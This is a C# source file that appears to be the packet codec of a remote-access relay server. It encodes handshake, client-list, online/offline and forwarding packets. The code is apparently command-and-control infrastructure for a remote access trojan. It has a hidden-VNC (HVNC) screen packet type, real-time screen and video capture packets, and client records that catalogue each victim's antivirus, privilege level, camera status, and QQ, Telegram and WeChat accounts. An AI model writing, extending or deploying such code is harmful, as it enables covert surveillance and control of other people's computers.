using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Text;
using Newtonsoft.Json;

namespace RemoteControl.Relay
{
    /// <summary>
    /// 数据包编解码
    /// 原协议格式: [4字节packetLength(含自身4字节)][1字节packetType][JSON Body]
    /// packetLength = 4 + 1 + body.Length
    /// </summary>
    public static partial class PacketCodec
    {
        // Relay协议包类型(与ePacketType对应, 必须<=255因为是1字节)
        const byte CYCLER_RELAY_HANDSHAKE = 200;
        const byte CYCLER_RELAY_CLIENT_LIST_REQUEST = 201;
        const byte CYCLER_RELAY_CLIENT_LIST_RESPONSE = 202;
        const byte CYCLER_RELAY_SELECT_CLIENT = 203;
        const byte CYCLER_RELAY_CLIENT_ONLINE = 204;
        const byte CYCLER_RELAY_CLIENT_OFFLINE = 205;
        const byte CYCLER_RELAY_FORWARD = 206;
        const byte CYCLER_RELAY_CLIENT_DATA = 207;
        const byte PACKET_GET_HOST_NAME_RESPONSE = 65;
        const byte PACKET_START_CAPTURE_SCREEN_RESPONSE = 6;
        const byte PACKET_START_CAPTURE_VIDEO_RESPONSE = 9;
        const byte PACKET_HVNC_SCREEN_RESPONSE = 111;

        /// <summary>
        /// 获取包类型(从完整包中提取, offset=4是packetType字节)
        /// </summary>
        public static byte GetPacketType(byte[] fullPacket)
        {
            if (fullPacket == null || fullPacket.Length < 5) return 0;
            return fullPacket[4];
        }

        public static bool IsDroppableRealtimePacket(byte[] fullPacket)
        {
            byte packetType = GetPacketType(fullPacket);
            return packetType == PACKET_START_CAPTURE_SCREEN_RESPONSE ||
                packetType == PACKET_START_CAPTURE_VIDEO_RESPONSE ||
                packetType == PACKET_HVNC_SCREEN_RESPONSE;
        }

        /// <summary>
        /// 获取包体JSON(从完整包中提取, offset=5开始是body)
        /// </summary>
        private static string GetBodyJson(byte[] fullPacket)
        {
            if (fullPacket == null || fullPacket.Length <= 5) return null;
            return Encoding.UTF8.GetString(fullPacket, 5, fullPacket.Length - 5);
        }

        /// <summary>
        /// 构建完整数据包(匹配原协议格式)
        /// [4字节packetLength][1字节packetType][body]
        /// packetLength = 4 + 1 + body.Length
        /// </summary>
        private static byte[] BuildPacket(byte packetType, object body)
        {
            byte[] bodyBytes = body != null
                ? Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(body))
                : new byte[0];

            int packetLength = 4 + 1 + bodyBytes.Length;
            byte[] packet = new byte[packetLength];

            Buffer.BlockCopy(BitConverter.GetBytes(packetLength), 0, packet, 0, 4);
            packet[4] = packetType;
            if (bodyBytes.Length > 0)
                Buffer.BlockCopy(bodyBytes, 0, packet, 5, bodyBytes.Length);

            return packet;
        }

        /// <summary>
        /// 解析握手包
        /// </summary>
        public static HandshakeData DecodeHandshake(byte[] fullPacket)
        {
            byte type = GetPacketType(fullPacket);
            if (type != CYCLER_RELAY_HANDSHAKE) return null;

            string json = GetBodyJson(fullPacket);
            if (string.IsNullOrEmpty(json)) return null;

            try
            {
                return JsonConvert.DeserializeObject<HandshakeData>(json);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 解析选择客户端包
        /// </summary>
        public static SelectClientData DecodeSelectClient(byte[] fullPacket)
        {
            string json = GetBodyJson(fullPacket);
            if (string.IsNullOrEmpty(json)) return null;
            try
            {
                return JsonConvert.DeserializeObject<SelectClientData>(json);
            }
            catch { return null; }
        }

        public static RelayDataFrameData DecodeRelayDataFrame(byte[] fullPacket)
        {
            byte type = GetPacketType(fullPacket);
            if (type != CYCLER_RELAY_FORWARD && type != CYCLER_RELAY_CLIENT_DATA)
                return null;

            RelayDataFrameData binaryFrame;
            if (TryDecodeRelayDataFrameBinary(fullPacket, out binaryFrame))
                return binaryFrame;

            string json = GetBodyJson(fullPacket);
            if (string.IsNullOrEmpty(json)) return null;
            try
            {
                return JsonConvert.DeserializeObject<RelayDataFrameData>(json);
            }
            catch { return null; }
        }

        public static byte[] BuildRelayDataFrame(string clientId, byte[] payload)
        {
            var frame = new RelayDataFrameData();
            frame.ClientId = clientId ?? "";
            frame.InnerPacketType = GetPacketType(payload);
            frame.Payload = payload ?? new byte[0];
            return BuildRelayDataFramePacket(CYCLER_RELAY_FORWARD, frame);
        }

        public static HostNameData DecodeHostNameResponse(byte[] fullPacket)
        {
            if (GetPacketType(fullPacket) != PACKET_GET_HOST_NAME_RESPONSE)
                return null;

            string json = GetBodyJson(fullPacket);
            if (string.IsNullOrEmpty(json))
                return null;
            try
            {
                return JsonConvert.DeserializeObject<HostNameData>(json);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 构建客户端列表响应包
        /// </summary>
        public static byte[] BuildClientListResponse(ConcurrentDictionary<string, ClientSession> clients)
        {
            var list = new List<object>();
            foreach (var kv in clients)
            {
                var s = kv.Value;
                list.Add(new
                {
                    ClientId = s.ClientId,
                    HostName = s.HostName,
                    IP = s.RemoteEndPoint,
                    AppPath = s.AppPath,
                    OnlineAvatar = s.OnlineAvatar,
                    OnlineTime = s.OnlineTime,
                    UserName = s.UserName,
                    LocalIP = s.LocalIP,
                    OSVersion = s.OSVersion,
                    Privilege = s.Privilege,
                    CameraStatus = s.CameraStatus,
                    Antivirus = s.Antivirus,
                    OnlineQQ = s.OnlineQQ,
                    TG = s.TG,
                    WX = s.WX,
                    UserStatus = s.UserStatus,
                    Region = s.Region,
                    ISP = s.ISP
                });
            }
            return BuildPacket(CYCLER_RELAY_CLIENT_LIST_RESPONSE, new { Clients = list });
        }

        /// <summary>
        /// 构建客户端上线通知包
        /// </summary>
        public static byte[] BuildClientOnline(ClientSession client)
        {
            return BuildPacket(CYCLER_RELAY_CLIENT_ONLINE, new
            {
                ClientId = client.ClientId,
                HostName = client.HostName,
                IP = client.RemoteEndPoint,
                AppPath = client.AppPath,
                OnlineAvatar = client.OnlineAvatar,
                OnlineTime = client.OnlineTime,
                UserName = client.UserName,
                LocalIP = client.LocalIP,
                OSVersion = client.OSVersion,
                Privilege = client.Privilege,
                CameraStatus = client.CameraStatus,
                Antivirus = client.Antivirus,
                OnlineQQ = client.OnlineQQ,
                TG = client.TG,
                WX = client.WX,
                UserStatus = client.UserStatus,
                Region = client.Region,
                ISP = client.ISP
            });
        }

        /// <summary>
        /// 构建客户端下线通知包
        /// </summary>
        public static byte[] BuildClientOffline(string clientId)
        {
            return BuildPacket(CYCLER_RELAY_CLIENT_OFFLINE, new { ClientId = clientId });
        }
    }
}
